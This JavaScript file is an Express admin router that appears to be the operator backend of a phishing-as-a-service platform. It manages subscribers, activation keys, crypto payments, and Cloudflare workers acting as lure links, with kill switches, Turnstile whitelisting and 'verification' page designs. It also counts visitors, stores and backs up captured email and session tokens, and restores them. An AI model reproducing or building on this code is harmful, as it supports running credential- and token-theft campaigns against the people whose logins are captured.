const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { adminAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');
const { generateActivationCode, generateSessionToken } = require('../utils/helpers');
const axios = require('axios');

// --- Middleware to check admin panel access ---
router.use(async (req, res, next) => {
  // Skip setup check endpoint
  if (req.path === '/check-setup') return next();
  
  const [admins] = await db.query('SELECT COUNT(*) as count FROM admins');
  if (admins[0].count === 0) {
    return res.status(404).json({ error: 'Not found' });
  }
  next();
});

// --- Dashboard ---
router.get('/dashboard', adminAuth, async (req, res) => {
  try {
    const [totalUsers] = await db.query('SELECT COUNT(*) as count FROM users');
    const [activeUsers] = await db.query("SELECT COUNT(*) as count FROM users WHERE subscription_status = 'active'");
    const [totalTokens] = await db.query('SELECT COUNT(*) as count FROM captured_tokens WHERE deleted = 0');
    const [pendingPayments] = await db.query("SELECT COUNT(*) as count FROM payments WHERE status = 'pending'");
    const [activeLinks] = await db.query("SELECT COUNT(*) as count FROM links WHERE status = 'active' AND kill_switched = 0");
    const [totalVisitors] = await db.query('SELECT COUNT(*) as count FROM visitors');
    
    res.json({
      total_users: totalUsers[0].count,
      active_users: activeUsers[0].count,
      total_tokens: totalTokens[0].count,
      pending_payments: pendingPayments[0].count,
      active_links: activeLinks[0].count,
      total_visitors: totalVisitors[0].count,
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Settings ---
router.get('/settings', adminAuth, async (req, res) => {
  try {
    const [settings] = await db.query('SELECT setting_key, setting_value FROM settings');
    const settingsObj = {};
    settings.forEach(s => { settingsObj[s.setting_key] = s.setting_value; });
    res.json(settingsObj);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.put('/settings', adminAuth, async (req, res) => {
  try {
    for (const [key, value] of Object.entries(req.body)) {
      await db.query(
        'INSERT INTO settings (setting_key, setting_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE setting_value = ?',
        [key, String(value), String(value)]
      );
    }
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'settings_update', JSON.stringify(req.body), req.ip]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Turnstile Origin Whitelist ---
// Get whitelisted domains
router.get('/turnstile-whitelist', adminAuth, async (req, res) => {
  try {
    const turnstileWhitelist = require('../services/turnstile-whitelist');
    const domains = await turnstileWhitelist.getWhitelistedDomains();
    res.json({ domains });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Add domain to Turnstile whitelist
router.post('/turnstile-whitelist', adminAuth, async (req, res) => {
  try {
    const { domain } = req.body;
    if (!domain) {
      return res.status(400).json({ error: 'Domain is required' });
    }

    const turnstileWhitelist = require('../services/turnstile-whitelist');
    const result = await turnstileWhitelist.addOriginToWhitelist(
      domain,
      config.CF_API_TOKEN,
      config.CF_ACCOUNT_ID
    );

    if (result.success) {
      await db.query(
        'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
        [req.admin.id, 'turnstile_whitelist_add', JSON.stringify({ domain }), req.ip]
      );
    }

    res.json(result);
  } catch (err) {
    res.status(500).json({ error: 'Server error', message: err.message });
  }
});

// Remove domain from Turnstile whitelist
router.delete('/turnstile-whitelist/:domain', adminAuth, async (req, res) => {
  try {
    const domain = decodeURIComponent(req.params.domain);
    const turnstileWhitelist = require('../services/turnstile-whitelist');
    const currentDomains = await turnstileWhitelist.getWhitelistedDomains();
    const newDomains = currentDomains.filter(d => d !== domain);

    await db.query(
      'INSERT INTO settings (setting_key, setting_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value)',
      ['turnstile_whitelist_domains', newDomains.join(',')]
    );

    await db.query(
      'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'turnstile_whitelist_remove', JSON.stringify({ domain }), req.ip]
    );

    res.json({ success: true, message: `Domain "${domain}" removed from Turnstile whitelist` });
  } catch (err) {
    res.status(500).json({ error: 'Server error', message: err.message });
  }
});

function maskLoginKey(key) {
  if (!key || typeof key !== 'string') return key;
  if (key.length <= 8) return key;
  return `${key.slice(0, 4)}...${key.slice(-4)}`;
}

function maskUserLoginKey(user) {
  if (user && user.login_key) {
    user.login_key = maskLoginKey(user.login_key);
  }
  return user;
}

// --- Users ---
router.get('/users', adminAuth, async (req, res) => {
  try {
    const { search, status, page = 1, limit = 50 } = req.query;
    let query = 'SELECT * FROM users WHERE 1=1';
    const params = [];
    
    if (search) { query += ' AND (login_key LIKE ? OR activation_code LIKE ?)'; params.push(`%${search}%`, `%${search}%`); }
    if (status) { query += ' AND subscription_status = ?'; params.push(status); }
    
    query += ' ORDER BY created_at DESC LIMIT ? OFFSET ?';
    params.push(parseInt(limit), (parseInt(page) - 1) * parseInt(limit));
    
    const [users] = await db.query(query, params);
    const [count] = await db.query('SELECT COUNT(*) as total FROM users');
    
    res.json({ users: users.map(maskUserLoginKey), total: count[0].total, page: parseInt(page) });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.get('/users/:id', adminAuth, async (req, res) => {
  try {
    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
    if (!users.length) return res.status(404).json({ error: 'User not found' });
    res.json(maskUserLoginKey(users[0]));
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Force reset user password (admin) ---
// -------------------------------------------
// Force disable user 2FA (admin)
// -------------------------------------------
async function usersHasColumn(col) {
  try {
    const [rows] = await db.query('SHOW COLUMNS FROM users LIKE ?', [col]);
    return rows.length > 0;
  } catch (e) { return false; }
}

let _hasTwoFaMethod = null;
async function hasTwoFaMethod() {
  if (_hasTwoFaMethod !== null) return _hasTwoFaMethod;
  _hasTwoFaMethod = await usersHasColumn('two_fa_method');
  return _hasTwoFaMethod;
}

router.post('/users/:id/disable-2fa', adminAuth, async (req, res) => {
  try {
    const has2faMethod = await hasTwoFaMethod();
    if (has2faMethod) {
      await db.query('UPDATE users SET totp_enabled = 0, two_fa_method = "none", totp_secret = NULL WHERE id = ?', [req.params.id]);
    } else {
      await db.query('UPDATE users SET totp_enabled = 0, totp_secret = NULL WHERE id = ?', [req.params.id]);
    }
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'force_disable_2fa', `User ID: ${req.params.id}`, req.ip]);
    res.json({ success: true });
  } catch (err) {
    console.error('[Admin] Force disable 2FA error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// -------------------------------------------
// Force reset user password (admin) ---
router.post('/users/:id/force-reset-password', adminAuth, async (req, res) => {
  try {
    const { new_password } = req.body;
    if (!new_password || new_password.length < 8) return res.status(400).json({ error: 'New password must be at least 8 characters' });
    const bcrypt = require('bcryptjs');
    const hash = await bcrypt.hash(new_password, 14);
    await db.query('UPDATE users SET password_hash = ? WHERE id = ?', [hash, req.params.id]);
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'force_reset_password', `User ID: ${req.params.id}`, req.ip]);
    res.json({ success: true });
  } catch (err) {
    console.error('[Admin] Force reset password error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

router.post('/users/:id/ban', adminAuth, async (req, res) => {
  await db.query("UPDATE users SET subscription_status = 'banned' WHERE id = ?", [req.params.id]);
  await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
    [req.admin.id, 'ban_user', `User ID: ${req.params.id}`, req.ip]);
  res.json({ success: true });
});

router.post('/users/:id/unban', adminAuth, async (req, res) => {
  await db.query("UPDATE users SET subscription_status = 'active' WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

router.post('/users/:id/suspend', adminAuth, async (req, res) => {
  await db.query("UPDATE users SET subscription_status = 'suspended' WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

router.post('/users/:id/unsuspend', adminAuth, async (req, res) => {
  await db.query("UPDATE users SET subscription_status = 'active' WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// --- Subscription management ---
router.post('/users/:id/grant-trial', adminAuth, async (req, res) => {
  const expiry = new Date(); expiry.setDate(expiry.getDate() + 1);
  await db.query("UPDATE users SET subscription_plan = 'trial', subscription_status = 'active', subscription_expiry = ? WHERE id = ?", [expiry, req.params.id]);
  res.json({ success: true, expiry });
});

router.post('/users/:id/grant-monthly', adminAuth, async (req, res) => {
  const expiry = new Date(); expiry.setDate(expiry.getDate() + 30);
  await db.query("UPDATE users SET subscription_plan = 'full', subscription_status = 'active', subscription_expiry = ? WHERE id = ?", [expiry, req.params.id]);
  res.json({ success: true, expiry });
});

router.post('/users/:id/grant-lifetime', adminAuth, async (req, res) => {
  await db.query("UPDATE users SET subscription_plan = 'lifetime', subscription_status = 'active', subscription_expiry = NULL WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

router.post('/users/:id/extend', adminAuth, async (req, res) => {
  const { days } = req.body;
  await db.query('UPDATE users SET subscription_expiry = DATE_ADD(COALESCE(subscription_expiry, NOW()), INTERVAL ? DAY), subscription_status = ? WHERE id = ?',
    [days || 30, 'active', req.params.id]);
  res.json({ success: true });
});

router.post('/users/:id/revoke', adminAuth, async (req, res) => {
  await db.query("UPDATE users SET subscription_status = 'expired', subscription_expiry = NOW() WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// --- Impersonate ---
router.get('/users/:id/impersonate', adminAuth, async (req, res) => {
  try {
    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
    if (!users.length) return res.status(404).json({ error: 'User not found' });
    
    const sessionToken = generateSessionToken();
    const token = jwt.sign({ user_id: users[0].id, session: sessionToken }, config.JWT_SECRET, { expiresIn: '1h' });
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'impersonate', `User ID: ${req.params.id}`, req.ip]);
    res.json({ token, user: { id: users[0].id, subscription_status: users[0].subscription_status } });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Key generation ---
router.post('/keys/generate', adminAuth, async (req, res) => {
  try {
    const { plan, duration_days, usage_limit, count = 1 } = req.body;
    const keys = [];
    
    for (let i = 0; i < count; i++) {
      const keyCode = generateActivationCode();
      const expiryDate = new Date();
      expiryDate.setFullYear(expiryDate.getFullYear() + 1);
      
      await db.query(
        'INSERT INTO activation_keys (key_code, plan, duration_days, usage_limit, created_by_admin_id, expires_at) VALUES (?, ?, ?, ?, ?, ?)',
        [keyCode, plan || 'full', duration_days || 30, usage_limit || 1, req.admin.id, expiryDate]
      );
      keys.push({ key: keyCode, plan: plan || 'full', duration_days: duration_days || 30 });
    }
    
    res.json({ keys });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.get('/keys', adminAuth, async (req, res) => {
  const [keys] = await db.query('SELECT * FROM activation_keys ORDER BY created_at DESC LIMIT 100');
  res.json(keys);
});

// --- Payments ---
router.get('/payments', adminAuth, async (req, res) => {
  const [payments] = await db.query('SELECT p.*, u.login_key FROM payments p LEFT JOIN users u ON p.user_id = u.id ORDER BY p.created_at DESC LIMIT 100');
  res.json(payments);
});

// --- Force verify payment + generate activation key ---
router.post('/payments/:uid/force-verify', adminAuth, async (req, res) => {
  const uid = req.params.uid;
  await db.query("UPDATE payments SET status = 'confirmed', confirmed_at = NOW() WHERE payment_uid = ?", [uid]);

  // Check if it's a renewal
  const [payment] = await db.query('SELECT * FROM payments WHERE payment_uid = ?', [uid]);
  if (!payment.length) return res.json({ success: true });

  const p = payment[0];
  const crypto = require('crypto');
  const keyCode = 'VG_' + crypto.randomBytes(12).toString('hex').toUpperCase();
  const [durRow] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_duration_days'");
  const duration = durRow.length ? parseInt(durRow[0].setting_value) : 30;
  const keyExpiry = new Date(Date.now() + 365 * 86400000);

  if (p.renew_key) {
    // Renewal: extend user's expiry
    await db.query("UPDATE users SET subscription_status = 'active', subscription_plan = 'full', subscription_expiry = DATE_ADD(COALESCE(subscription_expiry, NOW()), INTERVAL ? DAY) WHERE login_key = ?",
      [duration, p.renew_key]);
    res.json({ success: true, renewed: true, key: p.renew_key });
  } else {
    // New purchase: generate activation key
    await db.query('INSERT INTO activation_keys (key_code, plan, duration_days, usage_limit, expires_at) VALUES (?, ?, ?, ?, ?)',
      [keyCode, 'full', duration, 1, keyExpiry]);
    res.json({ success: true, key: keyCode });
  }

  // Notify user if they have Telegram linked
  if (p.user_id) {
    const [users] = await db.query('SELECT telegram_id, telegram_bot_token FROM users WHERE id = ?', [p.user_id]);
    if (users.length && users[0].telegram_id && users[0].telegram_bot_token) {
      const axios = require('axios');
      const msg = p.renew_key
        ? `✅ Subscription renewed by admin.`
        : `✅ Payment verified by admin.\nYour key: \`${keyCode}\``;
      axios.post(`https://api.telegram.org/bot${users[0].telegram_bot_token}/sendMessage`, {
        chat_id: users[0].telegram_id,
        text: msg,
        parse_mode: 'Markdown',
      }).catch(() => {});
    }
  }

  await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
    [req.admin.id, 'force_verify_payment', `UID: ${uid}`, req.ip]);
});

// --- Generate activation key (admin) ---
router.post('/genkey', adminAuth, async (req, res) => {
  try {
    const { plan = 'full', duration_days = 30, usage_limit = 1 } = req.body;
    const crypto = require('crypto');
    const keyCode = 'VG_' + crypto.randomBytes(12).toString('hex').toUpperCase();
    const keyExpiry = new Date(Date.now() + 365 * 86400000);
    await db.query(
      'INSERT INTO activation_keys (key_code, plan, duration_days, usage_limit, expires_at) VALUES (?, ?, ?, ?, ?)',
      [keyCode, plan, duration_days, usage_limit, keyExpiry]
    );
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'genkey', `Key: ${keyCode}, plan: ${plan}, days: ${duration_days}`, req.ip]);
    res.json({ key: keyCode, plan, duration_days });
  } catch (err) {
    console.error('[Genkey]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Global kill switch ---
router.post('/killswitch/global', adminAuth, async (req, res) => {
  await db.query('UPDATE links SET kill_switched = 1');
  await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
    [req.admin.id, 'killswitch_global', 'All links killed', req.ip]);
  res.json({ success: true });
});

router.post('/killswitch/user/:id', adminAuth, async (req, res) => {
  await db.query('UPDATE links SET kill_switched = 1 WHERE user_id = ?', [req.params.id]);
  res.json({ success: true });
});

// --- Workers ---
router.get('/workers', adminAuth, async (req, res) => {
  const [links] = await db.query('SELECT l.*, u.login_key FROM links l JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC');
  res.json(links);
});

router.get('/workers/:id/logs', adminAuth, async (req, res) => {
  const [logs] = await db.query('SELECT * FROM deployment_logs WHERE link_id = ? ORDER BY created_at DESC LIMIT 100', [req.params.id]);
  res.json(logs);
});

router.delete('/workers/:id', adminAuth, async (req, res) => {
  try {
    // Get link and user details
    const [links] = await db.query('SELECT l.*, u.cf_api_token, u.cf_account_id FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?', [req.params.id]);
    if (!links.length) return res.status(404).json({ error: 'Worker not found' });

    const link = links[0];

    // Delete Cloudflare worker if it exists
    if (link.worker_name && link.cf_api_token && link.cf_account_id) {
      try {
        const axios = require('axios');
        await axios.delete(
          `https://api.cloudflare.com/client/v4/accounts/${link.cf_account_id}/workers/scripts/${link.worker_name}`,
          { headers: { Authorization: `Bearer ${link.cf_api_token}` }, timeout: 15000 }
        );
        console.log(`[Admin] Deleted Cloudflare worker: ${link.worker_name}`);
      } catch (cfErr) {
        console.error('[Admin] Cloudflare deletion failed:', cfErr.message);
        // Continue anyway
      }
    }

    // Delete associated data
    await db.query('DELETE FROM visitors WHERE link_id = ?', [link.id]);
    await db.query('DELETE FROM captured_tokens WHERE link_id = ?', [link.id]);
    await db.query('DELETE FROM links WHERE id = ?', [link.id]);

    res.json({ success: true, message: 'Worker and all associated data deleted' });
  } catch (err) {
    console.error('[Admin] Worker deletion error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Templates management (admin) ---
router.get('/templates', adminAuth, async (req, res) => {
  const [templates] = await db.query('SELECT * FROM templates ORDER BY name ASC');
  res.json(templates);
});

router.post('/templates', adminAuth, async (req, res) => {
  const { name, category, config_json } = req.body;
  const [result] = await db.query('INSERT INTO templates (name, category, config_json) VALUES (?, ?, ?)',
    [name, category || 'preload', config_json || '{}']);
  res.status(201).json({ id: result.insertId });
});

router.delete('/templates/:id', adminAuth, async (req, res) => {
  await db.query("UPDATE templates SET status = 'disabled' WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// --- Verification designs management (admin) ---
router.get('/designs', adminAuth, async (req, res) => {
  const [designs] = await db.query('SELECT * FROM verification_designs ORDER BY name ASC');
  res.json(designs);
});

router.post('/designs', adminAuth, async (req, res) => {
  const { name, css_content, html_wrapper } = req.body;
  const [result] = await db.query('INSERT INTO verification_designs (name, css_content, html_wrapper) VALUES (?, ?, ?)',
    [name, css_content, html_wrapper]);
  res.status(201).json({ id: result.insertId });
});

router.get('/designs/:id', adminAuth, async (req, res) => {
  try {
    const [rows] = await db.query('SELECT * FROM verification_designs WHERE id = ?', [req.params.id]);
    if (!rows.length) return res.status(404).json({ error: 'Design not found' });
    res.json(rows[0]);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.put('/designs/:id', adminAuth, async (req, res) => {
  try {
    const { name, css_content, html_wrapper, status } = req.body;
    await db.query(
      'UPDATE verification_designs SET name = ?, css_content = ?, html_wrapper = ?, status = ? WHERE id = ?',
      [name, css_content, html_wrapper, status || 'active', req.params.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.delete('/designs/:id', adminAuth, async (req, res) => {
  await db.query("UPDATE verification_designs SET status = 'disabled' WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// --- Notices ---
router.get('/notices', adminAuth, async (req, res) => {
  const [notices] = await db.query('SELECT * FROM notices ORDER BY created_at DESC');
  res.json(notices);
});

router.post('/notices', adminAuth, async (req, res) => {
  const { title, content } = req.body;
  await db.query('INSERT INTO notices (title, content) VALUES (?, ?)', [title, content]);
  res.status(201).json({ success: true });
});

router.put('/notices/:id', adminAuth, async (req, res) => {
  const { title, content, active } = req.body;
  await db.query('UPDATE notices SET title = ?, content = ?, active = ? WHERE id = ?', [title, content, active ? 1 : 0, req.params.id]);
  res.json({ success: true });
});

// --- Feedback management ---
router.get('/feedback', adminAuth, async (req, res) => {
  const [feedback] = await db.query('SELECT f.*, u.login_key FROM feedback f JOIN users u ON f.user_id = u.id ORDER BY f.created_at DESC');
  res.json(feedback);
});

router.put('/feedback/:id', adminAuth, async (req, res) => {
  const { admin_reply, status } = req.body;
  await db.query('UPDATE feedback SET admin_reply = ?, status = ? WHERE id = ?', [admin_reply, status, req.params.id]);
  res.json({ success: true });
});

// --- Audit log ---
router.get('/audit', adminAuth, async (req, res) => {
  const [logs] = await db.query('SELECT * FROM audit_log ORDER BY created_at DESC LIMIT 200');
  res.json(logs);
});

// --- Login history ---
router.get('/login-history', adminAuth, async (req, res) => {
  const [history] = await db.query('SELECT * FROM login_history ORDER BY created_at DESC LIMIT 200');
  res.json(history);
});

// --- Analytics ---
router.get('/analytics', adminAuth, async (req, res) => {
  const [tokensByDay] = await db.query("SELECT DATE(created_at) as date, COUNT(*) as count FROM captured_tokens WHERE created_at > DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY DATE(created_at) ORDER BY date ASC");
  const [visitorsByDay] = await db.query("SELECT DATE(created_at) as date, COUNT(*) as count FROM visitors WHERE created_at > DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY DATE(created_at) ORDER BY date ASC");
  res.json({ tokens_by_day: tokensByDay, visitors_by_day: visitorsByDay });
});

// --- Export ---
// CSV-safe string: escapes values starting with =, +, -, @, or tab to prevent formula injection
function csvEscape(val) {
  const str = String(val ?? '');
  if (/^[=+\-@\t]/.test(str) || str.includes(',') || str.includes('"') || str.includes('\n')) {
    return '"' + str.replace(/"/g, '""') + '"';
  }
  return str;
}

router.get('/export/users', adminAuth, async (req, res) => {
  const [users] = await db.query('SELECT id, login_key, subscription_status, subscription_plan, subscription_expiry, created_at FROM users');
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename=users_export.csv');
  let csv = 'ID,Login Key,Status,Plan,Expiry,Created\n';
  users.forEach(u => {
    csv += `${csvEscape(u.id)},${csvEscape(maskLoginKey(u.login_key))},${csvEscape(u.subscription_status)},${csvEscape(u.subscription_plan)},${csvEscape(u.subscription_expiry || '')},${csvEscape(u.created_at)}\n`;
  });
  res.send(csv);
});

router.get('/export/payments', adminAuth, async (req, res) => {
  const [payments] = await db.query('SELECT * FROM payments ORDER BY created_at DESC');
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename=payments_export.csv');
  let csv = 'ID,UID,Coin,Amount USD,Status,Created,Confirmed\n';
  payments.forEach(p => { csv += `${csvEscape(p.id)},${csvEscape(p.payment_uid)},${csvEscape(p.coin)},${csvEscape(p.amount_usd)},${csvEscape(p.status)},${csvEscape(p.created_at)},${csvEscape(p.confirmed_at || '')}\n`; });
  res.send(csv);
});

// --- Diagnostics ---
router.get('/diagnostics', adminAuth, async (req, res) => {
  const results = {};
  
  // DB check
  try {
    await db.query('SELECT 1');
    results.database = 'OK';
  } catch (e) {
    results.database = `FAIL: ${e.message}`;
  }
  
  // Cloudflare check
  if (config.CF_API_TOKEN) {
    try {
      const cfRes = await axios.get('https://api.cloudflare.com/client/v4/user/tokens/verify', {
        headers: { Authorization: `Bearer ${config.CF_API_TOKEN}` },
      });
      results.cloudflare = cfRes.data.success ? 'OK' : `FAIL: ${JSON.stringify(cfRes.data.errors)}`;
    } catch (e) {
      results.cloudflare = `FAIL: ${e.message}`;
    }
  } else {
    results.cloudflare = 'Not configured';
  }
  
  // Telegram check
  if (config.TELEGRAM_BOT_TOKEN) {
    try {
      const tgRes = await axios.get(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/getMe`);
      results.telegram = tgRes.data.ok ? `OK: @${tgRes.data.result.username}` : 'FAIL';
    } catch (e) {
      results.telegram = `FAIL: ${e.message}`;
    }
  } else {
    results.telegram = 'Not configured';
  }
  
  // NowPayments check
  if (config.NOWPAYMENTS_API_KEY) {
    try {
      const npRes = await axios.get('https://api.nowpayments.io/v1/status', {
        headers: { 'x-api-key': config.NOWPAYMENTS_API_KEY },
      });
      results.nowpayments = npRes.data.message ? 'OK' : 'FAIL';
    } catch (e) {
      results.nowpayments = `FAIL: ${e.message}`;
    }
  } else {
    results.nowpayments = 'Not configured';
  }
  
  // DB size
  try {
    const [size] = await db.query("SELECT ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) as size_mb FROM information_schema.tables WHERE table_schema = ?", [config.DB.database]);
    results.database_size_mb = size[0].size_mb;
  } catch (e) {
    results.database_size_mb = 'Unknown';
  }
  
  res.json(results);
});

// --- Bulk import users ---
router.post('/users/import', adminAuth, async (req, res) => {
  try {
    const { csv_data } = req.body;
    if (!csv_data) return res.status(400).json({ error: 'CSV data required' });
    
    const lines = csv_data.split('\n').filter(l => l.trim());
    let imported = 0;
    
    for (let i = 1; i < lines.length; i++) {
      const cols = lines[i].split(',');
      if (cols.length >= 2) {
        const loginKey = cols[0].trim();
        const plan = cols[1].trim() || 'full';
        if (loginKey.startsWith('VG_')) {
          try {
            await db.query(
              'INSERT IGNORE INTO users (login_key, subscription_plan, subscription_status) VALUES (?, ?, ?)',
              [loginKey, plan, 'active']
            );
            imported++;
          } catch (e) { /* skip duplicates */ }
        }
      }
    }
    
    res.json({ imported });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Blacklist ---
router.get('/blacklist', adminAuth, async (req, res) => {
  const [list] = await db.query('SELECT * FROM blacklist ORDER BY created_at DESC');
  res.json(list);
});

router.post('/blacklist', adminAuth, async (req, res) => {
  const { email_pattern, domain, reason } = req.body;
  await db.query('INSERT INTO blacklist (email_pattern, domain, reason) VALUES (?, ?, ?)', [email_pattern, domain, reason]);
  res.status(201).json({ success: true });
});

router.delete('/blacklist/:id', adminAuth, async (req, res) => {
  await db.query('DELETE FROM blacklist WHERE id = ?', [req.params.id]);
  res.json({ success: true });
});

// --- Rate limit status ---
router.get('/rate-limit', adminAuth, (req, res) => {
  res.json({
    window_ms: config.RATE_LIMIT_WINDOW_MS,
    max_requests: config.RATE_LIMIT_MAX_REQUESTS,
  });
});

// --- Backup ---
router.get('/backup', adminAuth, async (req, res) => {
  try {
    const [users] = await db.query('SELECT * FROM users');
    const [links] = await db.query('SELECT * FROM links');
    const [tokens] = await db.query('SELECT id, user_id, link_id, email, token_type, ip_address, created_at FROM captured_tokens WHERE deleted = 0');
    const [payments] = await db.query('SELECT * FROM payments');
    
    const backup = {
      exported_at: new Date().toISOString(),
      users: users.length,
      links: links.length,
      tokens: tokens.length,
      payments: payments.length,
      data: { users, links, tokens, payments },
    };
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename=backup-${Date.now()}.json`);
    res.json(backup);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- Restore ---
router.post('/restore', adminAuth, async (req, res) => {
  try {
    const backupData = req.body.data;
    if (!backupData) return res.status(400).json({ error: 'Invalid backup data' });
    
    // Restore users
    if (backupData.users) {
      for (const user of backupData.users) {
        await db.query(
          `INSERT INTO users (id, login_key, email, password_hash, subscription_status, subscription_expires, telegram_id, telegram_bot_token, two_fa_method, totp_secret, totp_enabled, created_at) 
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
           ON DUPLICATE KEY UPDATE 
           email=VALUES(email), password_hash=VALUES(password_hash), subscription_status=VALUES(subscription_status),
           subscription_expires=VALUES(subscription_expires), telegram_id=VALUES(telegram_id),
           telegram_bot_token=VALUES(telegram_bot_token), two_fa_method=VALUES(two_fa_method),
           totp_secret=VALUES(totp_secret), totp_enabled=VALUES(totp_enabled)`,
          [user.id, user.login_key, user.email, user.password_hash, user.subscription_status, user.subscription_expires,
           user.telegram_id, user.telegram_bot_token, user.two_fa_method, user.totp_secret, user.totp_enabled, user.created_at]
        );
      }
    }
    
    // Restore links
    if (backupData.links) {
      for (const link of backupData.links) {
        await db.query(
          `INSERT INTO links (id, user_id, name, url, url_type, cf_account_id, cf_zone_id, cf_worker_name, cf_route, status, kill_switched, clicks, created_at)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
           ON DUPLICATE KEY UPDATE 
           name=VALUES(name), url=VALUES(url), url_type=VALUES(url_type), cf_account_id=VALUES(cf_account_id),
           cf_zone_id=VALUES(cf_zone_id), cf_worker_name=VALUES(cf_worker_name), cf_route=VALUES(cf_route),
           status=VALUES(status), kill_switched=VALUES(kill_switched), clicks=VALUES(clicks)`,
          [link.id, link.user_id, link.name, link.url, link.url_type, link.cf_account_id, link.cf_zone_id,
           link.cf_worker_name, link.cf_route, link.status, link.kill_switched, link.clicks, link.created_at]
        );
      }
    }
    
    // Restore tokens
    if (backupData.tokens) {
      for (const token of backupData.tokens) {
        await db.query(
          `INSERT INTO captured_tokens (id, user_id, link_id, email, token_type, ip_address, user_agent, created_at)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)
           ON DUPLICATE KEY UPDATE 
           user_id=VALUES(user_id), link_id=VALUES(link_id), email=VALUES(email),
           token_type=VALUES(token_type), ip_address=VALUES(ip_address), user_agent=VALUES(user_agent)`,
          [token.id, token.user_id, token.link_id, token.email, token.token_type, token.ip_address, token.user_agent, token.created_at]
        );
      }
    }
    
    // Restore payments
    if (backupData.payments) {
      for (const payment of backupData.payments) {
        await db.query(
          `INSERT INTO payments (id, user_id, payment_uid, amount, currency, coin, status, invoice_id, expires_at, created_at)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
           ON DUPLICATE KEY UPDATE 
           user_id=VALUES(user_id), amount=VALUES(amount), currency=VALUES(currency), coin=VALUES(coin),
           status=VALUES(status), invoice_id=VALUES(invoice_id), expires_at=VALUES(expires_at)`,
          [payment.id, payment.user_id, payment.payment_uid, payment.amount, payment.currency, payment.coin,
           payment.status, payment.invoice_id, payment.expires_at, payment.created_at]
        );
      }
    }
    
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'restore_backup', 'Restored backup', req.ip]);
    
    res.json({ success: true, message: 'Backup restored successfully' });
  } catch (err) {
    res.status(500).json({ error: 'Restore failed: ' + err.message });
  }
});

// --- Notify user ---
router.post('/users/:id/notify', adminAuth, async (req, res) => {
  try {
    const { message } = req.body;
    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
    if (!users.length) return res.status(404).json({ error: 'User not found' });
    
    const user = users[0];
    if (user.telegram_id && user.telegram_bot_token) {
      await axios.post(`https://api.telegram.org/bot${user.telegram_bot_token}/sendMessage`, {
        chat_id: user.telegram_id,
        text: `📢 Admin message:\n\n${message}`,
      });
      res.json({ success: true });
    } else {
      res.status(400).json({ error: 'User has no Telegram configured' });
    }
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Global tokens list
